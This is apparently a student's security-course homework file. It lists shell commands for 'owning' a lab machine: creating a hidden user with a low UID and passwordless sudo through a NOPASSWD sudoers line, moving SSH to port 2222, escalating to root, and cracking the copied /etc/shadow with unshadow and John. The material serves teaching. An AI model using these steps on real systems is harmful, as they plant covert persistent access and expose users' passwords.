## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    root@UbuntuDesktop:~# adduser --no-create-home sysd
Adding user `sysd' ...
Adding new group `sysd' (1014) ...
Adding new user `sysd' (1012) with group `sysd' ...
Not creating home directory `/home/sysd'.

2. Give your secret user a password: 
    - passwd sysd

3. Give your secret user a system UID < 1000:
    - usermod -u 501 sysd

4. Give your secret user the same GID:
   - groupmod -g 501 sysd

5. Give your secret user full `sudo` access without the need for a password:
    amend the visudo file and add the sysd for no password
    sysd  ALL=(ALL) NOPASSWD: ALL


6. Test that `sudo` access works without your password:

    root:~\ $ su sysd
$

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

nano /etc/ssh/sshd_config

 #Port 22
Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::
sudo service sshd restart


**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    sudo service sshd restart


2. Exit the `root` account:
    -exit


3. SSH to the target machine using your `sysd` account and port `2222`:
   ssh sysd@192.168.6.105 -p 2222


4. Use `sudo` to switch to the root user:
    sudo -s

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

     ssh sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

 root@scavenger-hunt:/etc# cp passwd passwd.txt
root@scavenger-hunt:/etc# cp shadow shadow.txt
root@scavenger-hunt:/etc# unshadow passwd.txt shadow.txt > passwords.txt
root@scavenger-hunt:/etc# john passwords.txt
